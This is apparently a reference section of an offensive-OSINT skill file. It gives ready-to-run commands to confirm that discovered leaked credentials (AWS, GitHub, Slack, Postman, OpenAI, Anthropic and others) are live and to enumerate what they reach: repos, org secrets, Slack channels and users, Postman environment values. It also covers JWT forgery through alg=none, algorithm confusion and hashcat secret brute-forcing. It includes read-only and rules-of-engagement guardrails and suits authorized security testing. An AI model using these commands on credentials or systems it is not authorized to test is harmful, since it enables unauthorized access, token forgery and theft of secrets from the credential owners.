# Read-Only Secret Validators

> Reference content for the `offensive-osint` skill. Originally §23 of the monolithic SKILL.md (refactored 2026-05-02 for size/load efficiency).

## 23. Read-Only Secret Validators

Use these to confirm a discovered credential is live. **Read-only, never destructive.** Tag every validation with `detectability` and `checked_at` (UTC).

### 23.1 Postman API Key (PMAK-*)

```
GET https://api.getpostman.com/me
Header: X-Api-Key: PMAK-<key>
```
- `200` → live; response contains `{user: {id, username, email}}`.
- `401` → dead.
- Scope: full read access to the user's Postman account (collections, env vars, history).
- Detectability: low.

### 23.2 AWS Access Key

```
sts:GetCallerIdentity
```
Use boto3:
```python
import boto3
sts = boto3.client('sts',
    aws_access_key_id='<AKIA...>',
    aws_secret_access_key='<secret>',
    region_name='us-east-1')
ident = sts.get_caller_identity()
# ident['Account'], ident['Arn'], ident['UserId']
```
- Valid → returns Account ID + ARN + UserId.
- Invalid → `InvalidClientTokenId` or `SignatureDoesNotMatch`.
- ARN scope: `:user/` is IAM user (broad), `:assumed-role/` is temp role (narrow), `:root` is account root (do NOT validate root keys you find).
- Detectability: **medium** (CloudTrail logs `GetCallerIdentity` in account `<found>`).

### 23.3 GitHub PAT

```
GET https://api.github.com/user
Header: Authorization: token <ghp_*>
```
- `200` → live; response contains `login`, `id`, `name`, `email` (if public).
- Response header `X-OAuth-Scopes` lists token scopes. `repo` scope = write to all accessible repos; `admin:org` = org admin.
- `401` → dead.
- Detectability: low.

### 23.4 Slack Token

```
POST https://slack.com/api/auth.test
Header: Authorization: Bearer <xox*-*>
```
- `200` with `{"ok": true}` → live; response includes `team`, `team_id`, `user`, `user_id`.
- `200` with `{"ok": false, "error": "invalid_auth"}` → dead.
- Detectability: low.

### 23.5 Anthropic API Key

```
GET https://api.anthropic.com/v1/models
Headers:
  x-api-key: sk-ant-api03-...
  anthropic-version: 2023-06-01
```
- `200` → live; response lists available models.
- `401` → dead.
- `403` with org_disabled → key valid but org disabled.
- Detectability: low; usage shows in Anthropic Console for the workspace owner.

### 23.6 OpenAI API Key

```
GET https://api.openai.com/v1/models
Header: Authorization: Bearer sk-...
```
- `200` → live; lists models (may include org-specific fine-tunes).
- `401` → dead.
- `429` → live but quota exhausted.
- Detectability: low; usage shows in OpenAI dashboard.

### 23.7 npm Token

```
GET https://registry.npmjs.org/-/whoami
Header: Authorization: Bearer npm_<token>
```
- `200` with `{"username": "<user>"}` → live.
- `401` → dead.
- For scope check: `GET /-/npm/v1/tokens` returns the token's permissions (read/publish).
- Detectability: low.

### 23.8 Atlassian API Token

```
GET https://<workspace>.atlassian.net/rest/api/3/myself
Auth: Basic <base64(email:ATATT3xFfGF0_...)>
```
- `200` → live; returns account profile + email.
- `401` → dead.
- Workspace required — extract from leaked repo URL or Atlassian dork results.
- Detectability: low.

### 23.9 DataDog API + APP Key

```
GET https://api.datadoghq.com/api/v1/validate
Headers:
  DD-API-KEY: <api-key>
  DD-APPLICATION-KEY: <app-key>
```
- `200` → both keys valid.
- `403` → either key invalid.
- Per-region URL varies: `api.datadoghq.eu`, `api.us3.datadoghq.com`, etc.
- Detectability: low; appears in DataDog audit log.

### 23.10 Validator output schema

```
{
  "status":          "verified_live" | "verified_dead" | "scope_restricted" |
                     "scope_unrestricted" | "validation_skipped_by_policy" |
                     "validation_unsupported" | "validation_failed_transient",
  "provider":        "postman" | "aws" | "github" | "slack" | "anthropic" | "openai" | "npm" | "atlassian" | "datadog",
  "account_id":      "<opaque>",
  "scope":           "<freeform>",
  "metadata":        {<provider-specific>},
  "checked_at":      "<UTC ISO8601>",
  "detectability":   "low" | "medium" | "high"
}
```

### 23.11 Hard rules

- Read-only endpoint only.
- Never use the validated credential to create, modify, delete, or send anything.
- Tag every validation with detectability.
- Record `checked_at` (UTC).
- If RoE forbids validation → `validation_skipped_by_policy`, stop, document.
- For root AWS keys, infrastructure-write GitHub PATs, or admin Slack tokens — flag for the operator and let them decide.

### 23.12 Post-Discovery Enumeration Workflows

After validation confirms a key is live, you often want to enumerate what it can do. Stay read-only.

**AWS access key — IAM enum:**
```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# Identity (already done as part of validation)
aws sts get-caller-identity

# IAM-user details (only if ARN was :user/)
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text)

# What can I actually do? (simulate-principal-policy for common dangerous actions)
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions rds:DescribeDBInstances

# Read-only enumeration of common services (do not WRITE)
aws s3 ls
aws ec2 describe-instances --output table --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# CloudTrail check — is logging on?
aws cloudtrail describe-trails

# Check MFA enforcement on the user
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name <username>
```

**GitHub PAT — repo enum:**
```bash
TOKEN="ghp_..."
H="Authorization: token $TOKEN"

# Scopes already captured from X-OAuth-Scopes header
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'

# All repos accessible (own + collaborator + org member)
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"

# Org memberships
curl -sk -m 10 -H "$H" "https://api.github.com/user/orgs"

# Per-org: members, repos, secrets (secrets endpoint is metadata-only — names not values)
ORG="<orgname>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets"   # requires admin:org

# Per-repo workflow secrets (metadata)
REPO="<orgname/reponame>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

**Slack token — workspace enum:**
```bash
TOKEN="xoxb-..."
H="Authorization: Bearer $TOKEN"

# auth.test already validated
# Identity details
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.identity" | jq .

# What conversations can I see? (sweeping check; respects scope)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | jq '.channels[] | {id, name, is_private}'

# Workspace info
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/team.info" | jq .

# User list (only if scope includes users:read)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.list?limit=100" | jq '.members[] | {name, real_name, is_admin}'

# DO NOT: chat.postMessage, files.upload, conversations.invite, etc.
```

**JWT — full triage workflow:**
```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# Decode header
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Look for: alg (none = critical, HS256/HS384/HS512 = symmetric, RS256/RS512 = asymmetric, ES256 = ECDSA)
# Look for: kid (key ID — possible JKU/X5U injection target)
# Look for: jku, x5u (JKU/X5U values — control these = sign attacker JWTs)

# Decode payload
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Look for: exp (expired = downgraded), iat, nbf
# Look for: sub, iss, aud (identity disclosure)
# Look for: roles, scopes, permissions (privilege markers)
# Look for: sensitive claims (email, employee ID, SSN, etc.)

# Algorithm-confusion test (RS→HS)
# If alg is RS256, try crafting an HS256 token signed with the public key as secret
# Tools: jwt_tool, jwt-cracker

# Brute-force HS256 secret (if HS256 + short-secret suspicion)
hashcat -m 16500 "$JWT" /path/to/wordlist.txt
# Or: john --format=HMAC-SHA256 jwt-hash.txt --wordlist=...

# Check `none` algorithm bypass
# Re-encode header with alg=none and empty signature; some libraries accept
NEW_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW_JWT="${NEW_JWT}.$(echo "$JWT" | cut -d. -f2)."
# Test against API
```

**Postman PMAK — workspace enum:**
```bash
PMAK="PMAK-..."
H="X-Api-Key: $PMAK"

# /me already done (validation)
curl -sk -m 10 -H "$H" https://api.getpostman.com/me | jq '.user'

# Workspaces
curl -sk -m 10 -H "$H" https://api.getpostman.com/workspaces | jq '.workspaces[] | {id, name, type}'

# Per-workspace collections
WS="<workspace-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections[]'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.environments[]'

# Per-collection requests (where the secrets often live)
COL="<collection-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item[]'
# Run secret catalog over the JSON

# Environments (env vars often contain creds)
ENV="<environment-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | jq '.environment.values[] | {key, value}'
```

**Anthropic API key — usage enum:**
```bash
KEY="sk-ant-api03-..."
H="x-api-key: $KEY"
A="anthropic-version: 2023-06-01"

# Models accessible
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/models | jq '.data[] | .id'

# Usage / quota (admin-scoped tokens only):
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .

# DO NOT: send actual completion requests against organization budget
```

**OpenAI API key — usage enum:**
```bash
KEY="sk-..."
H="Authorization: Bearer $KEY"

# Models
curl -sk -m 10 -H "$H" https://api.openai.com/v1/models | jq '.data | length'

# Org info (if key has org scope)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/organizations | jq .

# Files / fine-tunes (sometimes contain training data with PII)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .
```

**Generic key — provenance enum:**
1. Find the consuming domain (where in JS bundle did the key appear? what URL is the bundle served from?).
2. Check the API docs of the inferred service.
3. If the key matches a known regex, lookup vendor-specific scope check.
4. If unknown service, search GitHub for the key prefix (`gh search code "<prefix>" --type=code`).
5. Identify scope before validating; some keys are write-broad on first use.

---

